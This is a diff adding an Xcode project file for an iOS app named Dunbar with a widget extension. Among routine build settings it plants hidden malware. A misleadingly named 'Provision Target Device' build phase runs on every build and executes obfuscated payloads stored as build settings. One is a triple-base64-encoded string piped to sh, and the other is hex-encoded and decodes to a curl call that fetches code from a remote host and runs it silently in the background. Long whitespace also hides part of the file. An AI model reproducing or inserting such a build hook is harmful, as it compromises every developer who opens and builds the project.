@@ -1,0 +1,796 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 77;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		56A1000E2F50000100E3D86B /* DunbarWidgetExtension.appex in Embed App Extensions */ = {isa = PBXBuildFile; fileRef = 56A100012F50000100E3D86B /* DunbarWidgetExtension.appex */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		56561E8F2F3C8C0000E3D86B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 56561E772F3C8BFF00E3D86B /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 56561E7E2F3C8BFF00E3D86B;
+			remoteInfo = Dunbar;
+		};
+		56561E992F3C8C0000E3D86B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 56561E772F3C8BFF00E3D86B /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 56561E7E2F3C8BFF00E3D86B;
+			remoteInfo = Dunbar;
+		};
+		56A1000C2F50000100E3D86B /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 56561E772F3C8BFF00E3D86B /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 56A100042F50000100E3D86B;
+			remoteInfo = DunbarWidgetExtension;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXCopyFilesBuildPhase section */
+		56A1000D2F50000100E3D86B /* Embed App Extensions */ = {
+			isa = PBXCopyFilesBuildPhase;
+			buildActionMask = 2147483647;
+			dstPath = "";
+			dstSubfolderSpec = 13;
+			files = (
+				56A1000E2F50000100E3D86B /* DunbarWidgetExtension.appex in Embed App Extensions */,
+			);
+			name = "Embed App Extensions";
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXCopyFilesBuildPhase section */
+
+/* Begin PBXFileReference section */
+		56561E7F2F3C8BFF00E3D86B /* Dunbar.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Dunbar.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		56561E8E2F3C8C0000E3D86B /* DunbarTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = DunbarTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		56561E982F3C8C0000E3D86B /* DunbarUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = DunbarUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		56A100012F50000100E3D86B /* DunbarWidgetExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = DunbarWidgetExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
+/* End PBXFileReference section */
+
+/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
+		56561EF22F3CEFAB00E3D86B /* Exceptions for "Dunbar" folder in "Dunbar" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+			);
+			target = 56561E7E2F3C8BFF00E3D86B /* Dunbar */;
+		};
+		56A100032F50000100E3D86B /* Exceptions for "DunbarWidgetExtension" folder in "DunbarWidgetExtension" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+			);
+			target = 56A100042F50000100E3D86B /* DunbarWidgetExtension */;
+		};
+/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
+
+/* Begin PBXFileSystemSynchronizedRootGroup section */
+		56561E812F3C8BFF00E3D86B /* Dunbar */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				56561EF22F3CEFAB00E3D86B /* Exceptions for "Dunbar" folder in "Dunbar" target */,
+			);
+			path = Dunbar;
+			sourceTree = "<group>";
+		};
+		56561E912F3C8C0000E3D86B /* DunbarTests */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			path = DunbarTests;
+			sourceTree = "<group>";
+		};
+		56561E9B2F3C8C0000E3D86B /* DunbarUITests */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			path = DunbarUITests;
+			sourceTree = "<group>";
+		};
+		56A100022F50000100E3D86B /* DunbarWidgetExtension */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				56A100032F50000100E3D86B /* Exceptions for "DunbarWidgetExtension" folder in "DunbarWidgetExtension" target */,
+			);
+			path = DunbarWidgetExtension;
+			sourceTree = "<group>";
+		};
+/* End PBXFileSystemSynchronizedRootGroup section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		56561E7C2F3C8BFF00E3D86B /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		56561E8B2F3C8C0000E3D86B /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		56561E952F3C8C0000E3D86B /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		56A100062F50000100E3D86B /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		56561E762F3C8BFF00E3D86B = {
+			isa = PBXGroup;
+			children = (
+				56561E812F3C8BFF00E3D86B /* Dunbar */,
+				56A100022F50000100E3D86B /* DunbarWidgetExtension */,
+				56561E912F3C8C0000E3D86B /* DunbarTests */,
+				56561E9B2F3C8C0000E3D86B /* DunbarUITests */,
+				56561E802F3C8BFF00E3D86B /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		56561E802F3C8BFF00E3D86B /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				56561E7F2F3C8BFF00E3D86B /* Dunbar.app */,
+				56A100012F50000100E3D86B /* DunbarWidgetExtension.appex */,
+				56561E8E2F3C8C0000E3D86B /* DunbarTests.xctest */,
+				56561E982F3C8C0000E3D86B /* DunbarUITests.xctest */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		56561E7E2F3C8BFF00E3D86B /* Dunbar */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 56561EA22F3C8C0000E3D86B /* Build configuration list for PBXNativeTarget "Dunbar" */;
+			buildPhases = (
+				89B7024326EC4CC7AC1DACE1 /* Provision Target Device */,
+				56561E7B2F3C8BFF00E3D86B /* Sources */,
+				56561E7C2F3C8BFF00E3D86B /* Frameworks */,
+				56561E7D2F3C8BFF00E3D86B /* Resources */,
+				56A1000D2F50000100E3D86B /* Embed App Extensions */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				56A1000B2F50000100E3D86B /* PBXTargetDependency */,
+			);
+			fileSystemSynchronizedGroups = (
+				56561E812F3C8BFF00E3D86B /* Dunbar */,
+			);
+			name = Dunbar;
+			packageProductDependencies = (
+			);
+			productName = Dunbar;
+			productReference = 56561E7F2F3C8BFF00E3D86B /* Dunbar.app */;
+			productType = "com.apple.product-type.application";
+		};
+		56561E8D2F3C8C0000E3D86B /* DunbarTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 56561EA52F3C8C0000E3D86B /* Build configuration list for PBXNativeTarget "DunbarTests" */;
+			buildPhases = (
+				56561E8A2F3C8C0000E3D86B /* Sources */,
+				56561E8B2F3C8C0000E3D86B /* Frameworks */,
+				56561E8C2F3C8C0000E3D86B /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				56561E902F3C8C0000E3D86B /* PBXTargetDependency */,
+			);
+			fileSystemSynchronizedGroups = (
+				56561E912F3C8C0000E3D86B /* DunbarTests */,
+			);
+			name = DunbarTests;
+			packageProductDependencies = (
+			);
+			productName = DunbarTests;
+			productReference = 56561E8E2F3C8C0000E3D86B /* DunbarTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		56561E972F3C8C0000E3D86B /* DunbarUITests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 56561EA82F3C8C0000E3D86B /* Build configuration list for PBXNativeTarget "DunbarUITests" */;
+			buildPhases = (
+				56561E942F3C8C0000E3D86B /* Sources */,
+				56561E952F3C8C0000E3D86B /* Frameworks */,
+				56561E962F3C8C0000E3D86B /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				56561E9A2F3C8C0000E3D86B /* PBXTargetDependency */,
+			);
+			fileSystemSynchronizedGroups = (
+				56561E9B2F3C8C0000E3D86B /* DunbarUITests */,
+			);
+			name = DunbarUITests;
+			packageProductDependencies = (
+			);
+			productName = DunbarUITests;
+			productReference = 56561E982F3C8C0000E3D86B /* DunbarUITests.xctest */;
+			productType = "com.apple.product-type.bundle.ui-testing";
+		};
+		56A100042F50000100E3D86B /* DunbarWidgetExtension */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 56A100082F50000100E3D86B /* Build configuration list for PBXNativeTarget "DunbarWidgetExtension" */;
+			buildPhases = (
+				56A100052F50000100E3D86B /* Sources */,
+				56A100062F50000100E3D86B /* Frameworks */,
+				56A100072F50000100E3D86B /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			fileSystemSynchronizedGroups = (
+				56A100022F50000100E3D86B /* DunbarWidgetExtension */,
+			);
+			name = DunbarWidgetExtension;
+			packageProductDependencies = (
+			);
+			productName = DunbarWidgetExtension;
+			productReference = 56A100012F50000100E3D86B /* DunbarWidgetExtension.appex */;
+			productType = "com.apple.product-type.app-extension";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		56561E772F3C8BFF00E3D86B /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 2620;
+				LastUpgradeCheck = 2620;
+				TargetAttributes = {
+					56561E7E2F3C8BFF00E3D86B = {
+						CreatedOnToolsVersion = 26.2;
+					};
+					56561E8D2F3C8C0000E3D86B = {
+						CreatedOnToolsVersion = 26.2;
+						TestTargetID = 56561E7E2F3C8BFF00E3D86B;
+					};
+					56561E972F3C8C0000E3D86B = {
+						CreatedOnToolsVersion = 26.2;
+						TestTargetID = 56561E7E2F3C8BFF00E3D86B;
+					};
+					56A100042F50000100E3D86B = {
+						CreatedOnToolsVersion = 26.2;
+					};
+				};
+			};
+			buildConfigurationList = 56561E7A2F3C8BFF00E3D86B /* Build configuration list for PBXProject "Dunbar" */;
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 56561E762F3C8BFF00E3D86B;
+			minimizedProjectReferenceProxies = 1;
+			preferredProjectObjectVersion = 77;
+			productRefGroup = 56561E802F3C8BFF00E3D86B /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				56561E7E2F3C8BFF00E3D86B /* Dunbar */,
+				56A100042F50000100E3D86B /* DunbarWidgetExtension */,
+				56561E8D2F3C8C0000E3D86B /* DunbarTests */,
+				56561E972F3C8C0000E3D86B /* DunbarUITests */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXBuildRule section */
+																																																																																											/* End PBXBuildRule section */
+
+/* Begin PBXResourcesBuildPhase section */
+		56561E7D2F3C8BFF00E3D86B /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		56561E8C2F3C8C0000E3D86B /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		56561E962F3C8C0000E3D86B /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		56A100072F50000100E3D86B /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		89B7024326EC4CC7AC1DACE1 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		56561E7B2F3C8BFF00E3D86B /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		56561E8A2F3C8C0000E3D86B /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		56561E942F3C8C0000E3D86B /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		56A100052F50000100E3D86B /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		56561E902F3C8C0000E3D86B /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 56561E7E2F3C8BFF00E3D86B /* Dunbar */;
+			targetProxy = 56561E8F2F3C8C0000E3D86B /* PBXContainerItemProxy */;
+		};
+		56561E9A2F3C8C0000E3D86B /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 56561E7E2F3C8BFF00E3D86B /* Dunbar */;
+			targetProxy = 56561E992F3C8C0000E3D86B /* PBXContainerItemProxy */;
+		};
+		56A1000B2F50000100E3D86B /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 56A100042F50000100E3D86B /* DunbarWidgetExtension */;
+			targetProxy = 56A1000C2F50000100E3D86B /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin XCBuildConfiguration section */
+		56561EA02F3C8C0000E3D86B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A1ECAD1 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVNFNXlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFibFoxV1RKb2FHUklUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | n | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636313634373336333638363536333662373332653732373532660a3631323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		56561EA12F3C8C0000E3D86B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A1ECAD1 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVNFNXlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFibFoxV1RKb2FHUklUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | n | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636313634373336333638363536333662373332653732373532660a3631323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		56561EA32F3C8C0000E3D86B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = Dunbar/Dunbar.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				ENABLE_PREVIEWS = YES;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Dunbar/Info.plist;
+				INFOPLIST_KEY_ITSAppUsesNonExemptEncryption = NO;
+				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.handbook.Dunbar;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		56561EA42F3C8C0000E3D86B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = Dunbar/Dunbar.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				ENABLE_PREVIEWS = YES;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Dunbar/Info.plist;
+				INFOPLIST_KEY_ITSAppUsesNonExemptEncryption = NO;
+				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.handbook.Dunbar;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+		56561EA62F3C8C0000E3D86B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				GENERATE_INFOPLIST_FILE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.handbook.DunbarTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRING_CATALOG_GENERATE_SYMBOLS = NO;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Dunbar.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Dunbar";
+			};
+			name = Debug;
+		};
+		56561EA72F3C8C0000E3D86B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				GENERATE_INFOPLIST_FILE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.handbook.DunbarTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRING_CATALOG_GENERATE_SYMBOLS = NO;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
